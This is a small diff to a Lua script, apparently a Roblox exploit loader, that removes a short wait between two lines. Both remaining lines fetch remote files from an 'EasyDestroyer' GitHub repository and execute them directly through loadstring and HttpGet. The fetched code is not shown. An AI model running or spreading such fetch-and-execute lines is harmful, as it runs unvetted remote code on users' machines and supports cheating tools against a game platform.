@@ -1,5 +1,2 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/EasyDestroyer/EasyDestroyer.gg/main/Notify.exe"))()
-
-wait(0.1)
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/EasyDestroyer/EasyDestroyer.gg/main/Countdown.exe"))()
